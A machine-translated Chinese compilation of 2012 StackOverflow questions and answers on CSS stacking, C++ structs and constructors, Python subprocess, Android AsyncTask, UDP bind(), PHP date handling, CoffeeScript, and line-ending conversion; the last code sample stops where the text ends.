# StackOverflow 问答 10069000-10069999

# css - CSS：如何将对象向上移动一层？

> ID：10069003
> 
> 赞同：0
> 
> 时间：2012-04-09T04:48:44.687
> 
> 标签：css

HTML：

```
<div id="a">A</div>
<div id="b">B</div> 
```

CSS：

```
#a {
    float: left;

    width: 30px;
    height: 30px;
    color: white;
    background-color: red;
    border: 1px solid black;
    text-align: center;
}

#b {
    margin-left: 25px;

    width: 30px;
    height: 40px;
    color: white;
    background-color: green;
    border: 1px solid black;
    text-align: center;
} 
```

在这里查看我的代码：http: [//jsfiddle.net/mxtdg/](http://jsfiddle.net/mxtdg/)；

好像A在B之上，如果我想让B在A之上怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T04:54:02.793

只需使用`position:relative`and `z-index:10`on `#b`，就可以了。

**演示：[jsfiddle.net/Marcel/mxtdg/7/](http://jsfiddle.net/Marcel/mxtdg/7/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:10:43.110

它很简单，您可以将**位置**和**z-index**值定义为您想要在上面的任何**div 或 id**并记住一件事 z-index 仅在您定义您想要在上面的特定 div 或 id 的位置时才起作用。

看到你更新的代码： -

**HTML**

```
<div id="a">A</div>
<div id="b">B</div> 
```

**CSS**

```
#a {
    float: left;
    width: 30px;
    height: 30px;
    color: white;
    background-color: red;
    border: 1px solid black;
    text-align: center;
}

#b {
    margin-left: 25px;
    width: 30px;
    height: 40px;
    color: white;
    background-color: green;
    border: 1px solid black;
    text-align: center;
    position:relative;
    z-index:10;
} 
```

或查看演示：- [http://jsfiddle.net/mxtdg/19/](http://jsfiddle.net/mxtdg/19/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T04:59:13.693

你也可以浮动“b”然后你使用边距来调整位置。当它们都浮动时，在这种情况下您不需要更改 z-index，由于 HTML 的顺序，“b”将位于“a”之上。

[http://jsfiddle.net/mxtdg/12/](http://jsfiddle.net/mxtdg/12/)

# c++ - c++ 结构无法识别

> ID：10069007
> 
> 赞同：0
> 
> 时间：2012-04-09T04:49:21.793
> 
> 标签：c++, struct

我试图处理一个结构数组，但在访问成员时收到此错误：“必须有类/结构/联合”

```
struct person
{ int a; int b; int c;

}

person myArray[10];

int main()
{
 for(var i = 0; i < 10; i++)
 {
   //Assume that connection string already established
   outdata<< myArray[i].a << myArray[i].b << myArray[i].c << endl;//Error occurs here when accessing the members within my array of structs
 }
 return 0;
} 
```

请指教。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T04:50:53.527

```
struct person { int a; int b; int c;  } ;
                                       ^^^^ 
```

你错过了`;`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T05:01:56.393

你应该做

```
struct person
{ int a; int b; int c;

} ;
  ^^^^

person myArray[10]; 
```

或者

```
struct person
{ int a; int b; int c;

} myArray[10]; 
```

在第一种情况下，您定义一个新类型“person”（以分号结尾），然后声明这个新类型“person”的数组“myArray”。

在第二种情况下，您结合了 C/C++ 允许的类型声明和变量定义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T08:05:55.313

第一次更正：

```
 struct person
    { int a; int b; int c;

    } myArray[10]; 
```

第二次更正：

```
for(var i = 0; i < 10; i++) 
```

`var`c++ 不支持。相反，`auto`如果您在 VS2010 或更高版本中运行，则可以使用。否则你将不得不使用`int`

# python - 无法使用 win32 dir 命令和 Python 子进程查看文件

> ID：10069009
> 
> 赞同：1
> 
> 时间：2012-04-09T04:49:26.927
> 
> 标签：python, windows, subprocess, dir

我正在尝试读取文件并生成所述文件的哈希值。在大多数情况下，这进展顺利。但是，有一些文件我无法处理。例如：

```
file("c:\\windows\\system32\\nvvsvc.exe") 
```

产生错误：`IOError: [Errno 2] No such file or directory: 'c:\\windows\\system32\\nvvsvc.exe`

同样，命令：

```
subprocess.check_output(r"dir c:\windows\system32\nvvsvc.exe", shell = True) 
```

产生错误：

> 文件未找到
> 
> 回溯（最近一次通话最后）：
> 
> 文件“<stdin>”，第 1 行，在 <module> 中
> 
> 文件“C:\Python27\lib\subprocess.py”，第 544 行，在 check_output 中
> 
> 引发 CalledProcessError(retcode, cmd, output=output)
> 
> subprocess.CalledProcessError：命令 'dir c:\windows\system32\nvvsvc.exe' 返回非零退出状态 1

我尝试了许多变体，包括试图让 cacls.exe 承认那里有一个文件。但是，当我退出 python 实例 (exit()) 并执行 a`dir c:\windows\system32\nvvsvc.exe`时，它返回确实存在一个文件。

使用 calc.exe 进行的类似测试允许我从 python 内部查看它并对其进行哈希处理。

我正在运行 Python 2.7。我尝试使用管理权限启动 python（以管理员身份运行命令提示符），但这并没有改变任何东西。从 python 内部运行时，权限似乎发生了一些变化，以至于文件系统基本上假装该文件对 python 不存在。

作为参考，有问题的文件的所有者（还有其他类似的）是系统，文件上的 cacls 允许从用户、管理员和系统读取它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:09:26.153

简单的回答！（但不一定很容易找到）关于 IOError，这是因为您不需要转义反斜杠。

如上面的评论所述，第二部分看起来像是权限错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T19:18:54.140

如果这是 64 位系统，请尝试以下操作：

```
subprocess.check_output(r"c:\windows\SysNative\nvvsvc.exe", shell = True) 
```

这里的关键是“SysNative”

# model-view-controller - Ninject 3.0 MVC 内核扫描不起作用

> ID：10069011
> 
> 赞同：4
> 
> 时间：2012-04-09T04:49:49.270
> 
> 标签：model-view-controller, ninject-3

Ninject 3.0 中的 kernel.Scan 发生了什么？

```
 kernel.Scan(scanner =>
        {
            scanner.FromAssembliesMatching("LR.Service.*");
            scanner.FromAssembliesMatching("LR.Repository.*");
            scanner.BindWithDefaultConventions();
        } 
```

获取构建错误。“Ninject.IKernel”不包含“Scan”的定义，并且没有扩展方法“Scan”接受“Ninject.IKernel”类型的第一个参数

几个小时以来一直在敲我的头，试图弄清楚要改成什么。还没有看到任何好的网站或帖子解释如何简单地解决这个问题。

这一切都工作得很好，一些 ninject 得到了升级。经过数小时弄清楚为什么没有任何效果。我没有重新安装它（故意），不确定发生了什么，但现在我已经将所有内容重新安装到 3.0，认为它会更好，现在我陷入了缺乏任何帮助的困境。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T17:46:39.673

稍后会检查这个。认为这就是我一直在寻找的。

[http://sharpfellows.com/post/Ninject-Auto-registration-is-chang-in-version-3.aspx](http://sharpfellows.com/post/Ninject-Auto-registration-is-changing-in-version-3.aspx)

**更新：**

看看我关于自动发现的另一个 ninject3 问题

[Ninject 3.0 MVC kernel.bind 错误自动注册](https://stackoverflow.com/questions/10098883/ninject-3-0-mvc-kernel-bind-error-auto-registration)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-07-16T17:08:55.937

# c++ - 在另一个类中调用一个类的构造函数

> ID：10069012
> 
> 赞同：1
> 
> 时间：2012-04-09T04:49:58.800
> 
> 标签：c++

下周我有一个 C++ 测试，我正在为此做准备。当我有 2 个班级时，我很困惑，如下所示。我必须逐行执行代码，并且我对标记的行（`x = ...`和`y = ...`内部`class two`）感到困惑-执行从那里去哪里？

```
#include <iostream>
using namespace std;

class one {
    int n;
    int m;
    public:
    one() { n = 5; m = 6; cout << "one one made\n"; }
    one(int a, int b) {
        n = a;
        m = b;
        cout << "made one one\n";
    }
    friend ostream &operator<<(ostream &, one);
};

ostream &operator<<(ostream &os, one a) {
    return os << a.n << '/' << a.m << '=' <<
        (a.n/a.m) << '\n';
}

class two {
    one x;
    one y;
    public:
    two() { cout << "one two made\n"; }
    two(int a, int b, int c, int d) {
        x = one(a, b);  //here is my problem
        y = one(c, d);  //here is my problem
        cout << "made one two\n";
    }
    friend ostream &operator<<(ostream &, two);
};

ostream &operator<<(ostream &os, two a) {
    return os << a.x << a.y;
}

int main() {
    two t1, t2(4, 2, 8, 3);
    cout << t1 << t2;
    one t3(5, 10), t4;
    cout << t3 << t4;
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:11:03.530

从该行`x = one(a, b);` 跳转到该行 `one(int a, int b)` 并执行参数化构造函数`one`

线相同`y = one(c, d);`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T05:02:50.233

```
x = one(a, b);  //here is my problem
y = one(c, d);  //here is my problem 
```

这段代码所做的是它调用类的构造函数`one`并将新创建的这个类的实例分配给变量`x`和`y`。

类的构造函数`one`在第 9 行。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T07:01:28.253

当前方法仅在一个类中有默认构造函数时才有效。最好在构造函数初始化列表中初始化成员：

```
two(int a, int b, int c, int d) 
    : x(a,b), y(c,d)
{
        cout << "made one two\n";
} 
```

# java - 将光标与 AsyncTask 一起使用

> ID：10069016
> 
> 赞同：1
> 
> 时间：2012-04-09T04:50:22.140
> 
> 标签：java, android, android-asynctask, last.fm

我正在尝试为每个在我的手机上有音乐的艺术家下载图像，然后将这些图像显示在`GridView`. 我正在使用 Last.fm 推荐使用的[lastfm-java 库](http://code.google.com/p/lastfm-java/)。您调用获取艺术家图像的方法是`getImageURL(ImageSize size)`，但在执行此操作之前，您需要通过`String`参数告诉它您要引用哪个艺术家。所以，完全是这样的：

```
@Override
protected String doInBackground(Object... arg0) {
    Artist artist = Artist.getInfo(artistOrMbid, LASTFM_API_KEY);
    return artist.getImageURL(ImageSize.EXTRALARGE);      
} 
```

获取我手机上的所有艺术家不是问题，您只需参考`MediaStore`. 你会做这样的事情：

```
private void getArtists() {
    String[] projection = new String[] {
            MediaStore.Audio.Artists._ID, MediaStore.Audio.Artists.ARTIST,
    };
    String sortOrder = MediaStore.Audio.Artists.DEFAULT_SORT_ORDER;
    Cursor c = getActivity().getContentResolver().query(
            MediaStore.Audio.Artists.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
    if (c != null) {
        int count = c.getCount();
        if (count > 0) {
            final int ARTIST_IDX = c.getColumnIndex(MediaStore.Audio.Artists.ARTIST);
            for (int i = 0; i < count; i++) {
                c.moveToPosition(i);
            }
        }
        c.close();
        c = null;
    }
} 
```

`Adapter`for my`GridView`没什么特别的，它只是扩展了`BaseAdapter`.

**注意** [AQuery](http://code.google.com/p/android-query/)是我正在使用的一个库，它可以帮助缓存和加载`Bitmap`来自 URL 的 a。

```
public class GridViewAdapter extends BaseAdapter {

private final String[] imageURLs;

private final LayoutInflater mInflater;

private final Activity mActivity;

public GridViewAdapter(String[] urls, Activity activity) {
    imageURLs = urls;
    mActivity = activity;
    mInflater = (LayoutInflater)mActivity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
}

@Override
public int getCount() {
    return imageURLs.length;
}

@Override
public Object getItem(int position) {
    return position;
}

@Override
public long getItemId(int position) {
    return position;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {

    ViewHolder viewholder = null;

    // Inflate GridView items
    if (convertView == null) {
        convertView = mInflater.inflate(R.layout.gridview_items, null);
        viewholder = new ViewHolder();
        viewholder.mImage = (ImageView)convertView.findViewById(R.id.gridview_image);
        convertView.setTag(viewholder);
    } else {
        viewholder = (ViewHolder)convertView.getTag();
    }

    AQuery aq = new AQuery(convertView);

    aq.id(viewholder.mImage).image(imageURLs[position], false, false, 0, 0, null, 0, 0.75f);

        return convertView;
    }

}

class ViewHolder {
    public ImageView mImage;
} 
```

完整的，我`AsyncTask`的如下：

```
public class LastfmArtistGetImageURL extends AsyncTask<Object, Integer, String[]> implements
    Constants {

private static final String tag = LastfmArtistGetImageURL.class.getSimpleName();

private GridViewAdapter mGridAdapter;

// Test
private final String[] imageIds = {
        "http://userserve-ak.last.fm/serve/252/71875544.png",
        "http://userserve-ak.last.fm/serve/252/6258507.jpg",
        "http://userserve-ak.last.fm/serve/252/51274303.png",
        "http://userserve-ak.last.fm/serve/252/58672183.png",
        "http://userserve-ak.last.fm/serve/252/72029714.png",
        "http://userserve-ak.last.fm/serve/252/17666215.jpg",
        "http://userserve-ak.last.fm/serve/252/63247381.png",
        "http://userserve-ak.last.fm/serve/252/33665463.jpg"
};

private final String artistOrMbid;

private final GridView mGridView;

private final Activity mActivity;

public LastfmArtistGetImageURL(String name, GridView gv, Activity activity) {
    artistOrMbid = name;
    mGridView = gv;
    mActivity = activity;
}

@Override
protected String[] doInBackground(Object... arg0) {
    Artist artist = Artist.getInfo(artistOrMbid, LASTFM_API_KEY);
    Collection<String> col = new ArrayList<String>();
    col.add(artist.getImageURL(ImageSize.EXTRALARGE));
    return col.toArray(new String[0]);
}

@Override
protected void onPostExecute(String[] result) {
    if (result != null)
        mGridAdapter = new GridViewAdapter(imageIds, mActivity);
    mGridView.setAdapter(mGridAdapter);
    super.onPostExecute(result);
    }
} 
```

当我调用 my`AsyncTask`时，我在我的`getArtists()`方法中调用它，如下所示：

`new LastfmArtistGetImageURL(c.getString(ARTIST_IDX), mGridView, getActivity()) .execute();`

**问题**

当我调用这个时，所有艺术家的图像都会下载，但他们会一个接一个地下载`position 0`我的`GridViewAdapter`. 换句话说，一个图像加载，然后是下一个，等等，`position`当我需要将它们放入每个可用`position`的`GridView`. 当我返回我的测试`String[]`时，我的`AsyncTask`一切都正常工作。所有图像都按顺序放置在`GridView`.

**问题**

我的问题是，如何`GridView`正确返回我下载到我的每个艺术家图像，为什么图像目前只`position`在我的第一个加载`GridViewAdapter`？

**编辑 - Shubhayu 的回答** 我将我的设置移动`GridViewAdapter`到我的`getArtists()`方法中。这会导致所有图像都被下载（如 LogCat 所说），但只有最后一个图像被设置在我的`GridView`.

```
String[] test = new LastfmArtistGetImageURL(c.getString(ARTIST_IDX),
mGridView, getActivity()).execute().get();
mGridAdapter = new GridViewAdapter(test, getActivity());
mGridView.setAdapter(mGridAdapter); 
```

**smoak 的回答** 这导致只有最后一个艺术家图像（默认顺序）被下载并应用到我的`GridView`.

```
String[] test = {c.getString(ARTIST_IDX)};
new LastfmArtistGetImageURL(test, mGridView, getActivity()).execute(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:44:26.793

您`AsyncTask`看起来好像每次都在为每个艺术家执行它。因此，您`AsyncTask`只返回一个艺术家的图像并`GridView`获得该艺术家的图像，然后`AsyncTask`为下一个艺术家运行，`GridView`使用新图像进行更新等等。您需要做的是修改您`AsyncTask`的字符串数组，以获取艺术家姓名并在它们中循环`doInBackground`以获取他们的图像。

```
// ... SNIPPED

public LastfmArtistGetImageURL(String[] names, GridView gv, Activity activity) {
    artistsOrMbids = names;
    mGridView = gv;
    mActivity = activity;
}

@Override
protected String[] doInBackground(Object... arg0) {
    Collection<String> col = new ArrayList<String>();
    for (String nameOrMbid : this.artistsOrMbids) {
        Artist artist = Artist.getInfo(artistOrMbid, LASTFM_API_KEY);
        col.add(artist.getImageURL(ImageSize.EXTRALARGE));
    }
    return col.toArray(new String[0]);
}

// .... SNIPPED 
```

并传入所有艺术家姓名：

```
String[] artists = { "The Black Keys", "Rush", "The Allman Brothers" }; 
new LastfmArtistGetImageURL(artists, mGridView, getActivity()).execute(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:48:17.897

这就是正在发生的事情，当您通过测试字符串时，它有一个图像列表，因此 gridview 可以正确显示它们。但是当您使用它为每个艺术家下载图像时，事情就会出错。

每次打电话

> new LastfmArtistGetImageURL(c.getString(ARTIST_IDX), mGridView, getActivity()).execute();

它运行 doInBackground()，完成它，然后立即调用 onPostExecute() 在其中创建一个新适配器并传递您的结果，该结果基本上包含单个调用的单个图像。

所以你需要做的是在你的异步任务中下载所有图像，然后创建一个适配器并将所有图像传递给它。目前还没有发生这种情况。

**编辑**

如果您看到 AsyncTask，您会发现每次调用它时，字符串数组都只返回一张图像。所以不是返回一个字符串数组，而是返回一个字符串。

接下来，我建议您在适配器中使用 ArrayList 而不是 String 数组。在您的 getArtists() 中，创建一个 ArrayList 并在您每次调用时

> new LastfmArtistGetImageURL(test, mGridView, getActivity()).execute();

将结果添加到您的 ArrayList。遍历所有艺术家后，您的 ArrayList 将包含所有图像。

现在将其设置为适配器。（如果将适配器从字符串更改为数组列表，则无需稍微更改适配器。）

# c - 使用套接字编程时何时使用 bind()？

> ID：10069020
> 
> 赞同：0
> 
> 时间：2012-04-09T04:50:45.537
> 
> 标签：c, sockets, unix, network-programming

我正在编写一个简单的发送方和接收方程序以使用 UDP 进行传输，因此它是无连接的，但我无法确定我的接收方程序是否需要调用 bind() 或服务器和/或两者。我的接收程序（客户端）将处于无限循环中，等待从发送方（服务器）接收数据，然后打印出数据。除了将地址/端口与特定套接字相关联之外，我不太确定 bind() 究竟做了什么。为什么我需要调用 bind()？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:03:50.713

您需要调用[`bind(2)`](http://linux.die.net/man/2/bind)，以便操作系统知道将网络数据包路由到哪个应用程序。当您`bind`使用给定协议（例如 TCP 或 UDP）的特定端口调用时，您会问它“每当您在端口 XXXXX 上看到网络数据包时，请给我”。

例如，假设您的程序的两个副本正在运行，它们都想在同一个端口上侦听 UDP 数据包。如果他们都`bind`在同一个端口上调用，那么一个会成功，一个会失败，因为操作系统可以仲裁谁绑定到每个端口。然后，在该端口上接收到的任何数据包都将被提供给成功绑定到该端口的程序实例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:36:55.503

当你想让一个套接字成为一个固定的地址或/和端口时，你可以使用 bind。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:46:18.610

在开发网络应用程序时见，您需要指定“地址和端口”来绑定，因为如果您想为 Localhost 设置它，您的应用程序无法与整个网络进行通信，它仅适用于您正在通信的系统。如果你用你的网络地址设置它不能作为 localhost 通信它只能与网络通信，如果你将它设置为 0，那么它可以用作 localhost 和网络。

# php - 如何在 PHP 中获取最后一个“特定（例如三月）”月份？

> ID：10069025
> 
> 赞同：0
> 
> 时间：2012-04-09T04:51:27.253
> 
> 标签：php

我想显示最后一个三月。我正在使用以下代码，

```
 date("Y-m-d",strtotime("last March")); 
```

任何建议或参考都会非常有帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T05:15:00.160

```
$year = date('Y');
if (date('n') < 3) {
    $year--;
}

$beginningOfLastMarch = mktime(0, 0, 0, 3, 1, $year); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:01:21.363

见[http://php.net/date](http://php.net/date)

```
date('M') 
```

或者

```
date('n') 
```

或者

```
date('m') 
```

或者，如果你有约会

```
$mydate = "2010-05-12 13:57:01"; 
```

你可以这样

```
$month = date("m",strtotime($mydate)); 
```

m 月份的数字表示，前导零从 01 到 12

n 月份的数字表示，没有前导零 1 到 12

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-15T11:01:43.157

我找到了一种更好的方法来做到这一点，但将我的旧解决方案留在了底部，因为在某些用例中它可能仍然与某些人相关。

我找到了一个更好的解决我的问题的方法，它包括在 前面加上一个日期`strtotime`，然后使用相对选择器。假设我想选择`4th of March last year`. 我只是做：

```
strtotime('{THIS_YEAR}-03-04 last year'); 
```

显然，在处理这个字符串之前，我会`{THIS_YEAR}`用`date('Y')`. 这很有效，仅仅是因为我硬编码了我想要的值。`03-04`作为`4th of March`. 我可以用我喜欢的任何日期替换这些数字。

# 旧解决方案

* * *

我想出了一个对我有用的解决方案，它实际上并不涉及编写任何复杂的算法或任何东西。它确实涉及稍微扩展`strtotime`虽然的语法。

尽管 PHP`strtotime`并不完美（适用于所有用例），但我发现如果你将`strtotime`' 结合在一起，那么你可以让它变得非常强大。

说如果我想选择`4th of last month`，我真的不能这样做......`strtotime`并不真正接受序数。即`4th`。

但是，我可以做到`first day of last month`，这非常接近。我所需要的只是改变这一天。

`strtotime`允许 a`time()`作为第二个参数传递。这意味着您可以`strtotime`像这样链接：

```
$time = time();
$time = strtotime('first day of last month', $time);
$time = strtotime('+3 days', $time);
echo date('Y-m-d H:i', $time);

// I know we don't really need the initial `$time = time()`. It is there for clarity 
```

这将为我们提供正确的时间：`4th of last month`.

这就是一些语法糖的用武之地......

我们可以编写一个函数来接受由分隔符分隔的部分`strtotime`字符串：

```
function my_strtotime($str, $time = null, $delim = '|'){
    $time = ($time==null ? time() : $time);
    foreach(explode($delim, $str) as $cmd){
        $time = strtotime($cmd, $time);
    }
    return $time;
} 
```

可以这样使用：

```
$str = 'first day of last month | +3 days';
echo date('Y-m-d H:i', my_strtotime($str)); 
```

我们终于得到它了。`4th of last month`.

无需从`explode`调用中去除空格，因为`strtotime`已经处理了额外的空格。

这可以处理复杂的间隔，比如`last year | first day of March | +9 days | 14:00`总是返回`10th of March at 2pm last year`。

最好的事情是`last year | first day of March | +9 days | 14:00`可以使用所需的值生成类似的字符串，例如

```
last year | first day of {MONTH} | +{DAYS-1} days | {TIME} 
```

这可能需要额外的工作来改进它，但我只是想快速把它放在这里，所以它可以帮助其他人解决这个问题

# javascript - 编译 Coffeescript 时不要添加 var

> ID：10069026
> 
> 赞同：2
> 
> 时间：2012-04-09T04:51:41.560
> 
> 标签：javascript, node.js, inheritance, coffeescript

我正在编写一个使用[John Resig 的简单类继承](http://ejohn.org/blog/simple-javascript-inheritance/)的简单应用程序。我在 Node.js 中这样做，我也在使用 CoffeeScript。[我正在尝试编写 CoffeeScript 以在 BrowserQuest 游戏中](https://github.com/mozilla/BrowserQuest/blob/master/server/js/character.js#L8)输出类似于此文件的代码。

但是，当我这样编写 CoffeeScript 时：

```
cls = require './class'

module.exports = Model = cls.Class.extend({
  init: () ->
    console.log 'Model.init()'
}) 
```

“var”会自动添加到模型中，因此它似乎没有正确导出。

```
var Model, cls;

cls = require('../class');

module.exports = Model = cls.Class.extend({
  init: function() {
    return console.log('Model.init()');
  }
}); 
```

有没有办法将变量标记为不使用 CoffeeScript 的“var”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T07:07:50.050

每个变量在 CoffeeScript 上都用一个 var 定义，除非它被赋予了一个作用域：

```
cls = require './class'

module.exports = GLOBAL.Model = cls.Class.extend({
  init: () ->
    console.log 'Model.init()'
}) 
```

编译为：

```
var cls;

cls = require('./class');

module.exports = GLOBAL.Model = cls.Class.extend({
  init: function() {
    return console.log('Model.init()');
  }
}); 
```

我以 GLOBAL 为例，但您可以使用任何范围。

# degrees - 为什么我们在编程中使用弧度？

> ID：10069027
> 
> 赞同：7
> 
> 时间：2012-04-09T04:51:51.923
> 
> 标签：degrees, radians, angle

我和其他人一样喜欢弧度，并且通常更喜欢使用弧度而不是度数，但是为什么我们在编程中使用弧度呢？

要将某物旋转 180 度，您需要将其旋转`3.14159265...`. 当然，大多数语言都有某种常数来表示 pi，但是当我们可以使用整数时，为什么我们还要使用像 pi 这样的无理数，尤其是对于简单的程序？

我们依靠计算机说它`3.14159265`与 pi 足够接近，正弦和余弦之类的函数返回正确的值，但如果计算机太准确，那么这些值会稍微偏离（`sin(3.14159265) = 0.00000000358979303`）。使用 180 度时，这不是问题。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T04:59:17.173

这实际上*是*一个问题，它只是以不同的方式出现，特别是如果你不坚持 90 度增量。

最终，它归结为用于计算三角函数的机制是根据弧度定义的（即使由 CPU 的微码实现；您可能想检查数值方法文本以了解详细信息，但它们确实希望以弧度完成) 并且以度数工作则需要两者之间的不断转换，从而导致累积误差。由于浮点（尤其是超越数）已经内置了大量错误，因此在顶部添加额外的转换既会减慢速度，也会增加更多可避免的错误。

# python - 使用 Python/BeautifulSoup 遍历 .txt 文件中的多个 URL

> ID：10069034
> 
> 赞同：1
> 
> 时间：2012-04-09T04:53:21.237
> 
> 标签：python, beautifulsoup

我正在尝试创建一个脚本，该脚本采用包含多行 YouTube 用户名的 .txt 文件，将其附加到 YouTube 用户主页 URL，然后通过爬网获取配置文件数据。

下面的代码为我提供了一个用户想要的信息，但我不知道从哪里开始导入和迭代多个 URL。

```
#!/usr/bin/env python
# -- coding: utf-8 --
from bs4 import BeautifulSoup
import re
import urllib2

# download the page
response = urllib2.urlopen("http://youtube.com/user/alxlvt")
html = response.read()

# create a beautiful soup object
soup = BeautifulSoup(html)

# find the profile info & display it
profileinfo = soup.findAll("div", { "class" : "user-profile-item" })
for info in profileinfo:
    print info.get_text() 
```

有人有什么建议吗？

例如，如果我有一个 .txt 文件，内容如下：

```
username1
username2
username3
etc. 
```

我怎样才能遍历这些，将它们附加到[http://youtube.com/user/%s](http://youtube.com/user/%s)并创建一个循环来提取所有信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:04:49.103

如果您不想使用实际的抓取模块（如 scrapy、mechanize、selenium 等），您可以继续迭代您编写的内容。

1.  *使用文件对象的迭代逐行读取关于文件对象*的一个​​简洁事实是，如果它们是用“rb”打开的，它们实际上调用 readline() 作为它们的迭代器，所以你可以这样`for line in file_obj`做在文档中逐行进行。
2.  *我在下面使用的*连接网址*`+`，但您也可以使用连接功能。*
**   *制作一个 url 列表*- 让你错开你的请求，这样你就可以进行[富有同情心的屏幕抓取。](http://dev.lethain.com/an-introduction-to-compassionate-screenscraping/)

    ```
    # Goal: make a list of urls
    url_list = []

    # use a try-finally to make sure you close your file.
    try:
        f = open('pathtofile.txt','rb')
        for line in f:
            url_list.append('http://youtube.com/user/%s' % line)
        # do something with url list (like call a scraper, or use urllib2
    finally:
        f.close() 
    ```* 

 *编辑：Andrew G 的字符串格式更清晰。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:04:16.110

您需要打开文件（最好使用`with open('/path/to/file', 'r') as f:`语法），然后`f.readline()`循环执行。将 readline() 的结果分配给“用户名”之类的字符串，然后在循环中运行当前代码，以`response = urllib2.urlopen("http://youtube.com/user/%s" % username)`.*

# c++ - 如何将文本文件从 Windows 转换为 Unix

> ID：10069038
> 
> 赞同：3
> 
> 时间：2012-04-09T04:53:57.037
> 
> 标签：c++

从 Unix 转换到 Windows 时，我得到了正确的输出；但是，当从 Windows 转到 Unix 时，我得到了一些奇怪的输出。我认为我所要做的就是删除回车符'\ r'。这虽然行不​​通。当我运行代码后打开文本文件时，我得到了一些奇怪的结果，第一行是正确的，然后所有的地狱都输了。

```
 int main( )
{
   bool windows = false;
   char source[256];
   char destination[256]; // Allocate the max amount of space for the filenames.

   cout << "Please enter the name of the source file: ";
   cin >> source;

   ifstream fin( source, ios::binary );
   if ( !fin )          // Check to make sure the source file exists.
   {
      cerr << "File " << source << " not found!";
      getch();
      return 1;
   }//endif

   cout << "Please enter the name of the destination file: ";
   cin >> destination;

   ifstream fest( destination );
   if ( fest )          // Check to see if the destination file already exists.
   {
      cout << "The file " << destination << " already exists!" << endl;
      cout << "If you would like to truncate the data, please enter 'Y', "
           << "otherwise enter 'N' to quit: ";
      char answer = char( getch() );
      if ( answer == 'n' || answer == 'N' )
      {
         return 1;
      }//endif
   }//endif
   clrscr();            // Clear screen for neatness.

   ofstream fout( destination, ios::binary );
   if ( !fout.good() )  // Check to see if the destination file can be edited.
   {
      cout << destination << "could not be opened!" << endl;
      getch();
      return 1;
   }//endif
                        // Open the destination file in binary mode.
   fout.open( destination, ios::binary );
   char ch = fin.get(); // Set ch to the first char in the source file.
   while ( !fin.eof() )
   {
      if ( ch == '\x0D' ) // If ch is a carriage return, then the source file
      {                   // must be in a windows format.
         windows = true;
      }//endif
      if ( windows == true )
      {
         ch = fin.get();  // Advance ch, so that at the bottom of the loop, the
      }//endif            // carriage return is not coppied into the new file.
      if ( windows == false )
      {
         if ( ch == '\x0A' )    // If the file is in the Unix format..
         {
            fout.put( '\x0D' ); // When a new line is found, output a carriage
         }//endif               // return.
      }//endif

      fout.put( ch );
      ch = fin.get();
   }//endwh
   if ( windows == true )
   {
      fout.put( '\x0A' );
   }//endif
   fout.close();
   fin.close();                 // Close yer files.

   if ( windows == true )       // A little output for user-friendly-ness.
   {
      cout << "The contents of " << source << " have been coppied to "
           << destination << " and converted to Unix format." << endl;
   }else{
      cout << "The contents of " << source << " have been coppied to "
           << destination << " and converted to Windows format." << endl;
   }//endif
   cout << "Enter any key to quit.." << endl;
   getch();
   return 0;
}//endmn 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T05:50:10.557

*如果*您只需要转换简单的 ascii（也许是 utf-8）文本文件，您可以在循环中以翻译模式逐行读取源文件（在这种情况下为您处理足够的换行符）与非成员 getline() 然后将行输出到输出文件，同时在除最后一行之外的每一行之后插入 \n 或 \r\n。

然后，您可以删除原始文件并将临时文件重命名为原始文件的名称。或者，如果您愿意，您可以改为将行 push_back 放入 vector<string>。然后，您可以关闭文件的输入句柄，执行 ofstream out("filename", ios_base::trunc) 并将向量的元素写入文件，同时用所需的换行符分隔它们。

这一切都取决于您的要求。

以下是一个错误处理最少的示例。但是，我想在这里展示的只是 FOR 循环和逐行读取，这是一种不同的做事方式。

convert_file.exe "test.txt" "linux"

convert_file.exe “test.txt” “赢”

```
#include <iostream>
#include <string>
#include <fstream>
#include <ostream>
#include <cstdlib>
#include <cstdio>
using namespace std;

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cerr << "Usage: this.exe file_to_convert newline_format(\"linux\" or \"win\")" << endl;
        return EXIT_FAILURE;
    }
    string fmt(argv[2]);
    if (fmt != "linux" && fmt != "win") {
        cerr << "Invalid newline format specified" << endl;
        return EXIT_FAILURE;
    }
    ifstream in(argv[1]);
    if (!in) {
        cerr << "Error reading test.txt" << endl;
        return EXIT_FAILURE;
    }
    string tmp(argv[1]);
    tmp += "converted";
    ofstream out(tmp.c_str(), ios_base::binary);
    if (!out) {
        cerr << "Error writing " << tmp << endl;
        return EXIT_FAILURE;
    }
    bool first = true;
    for (string line; getline(in, line); ) {
        if (!first) {
            if (fmt == "linux") {
                out << "\n";
            } else {
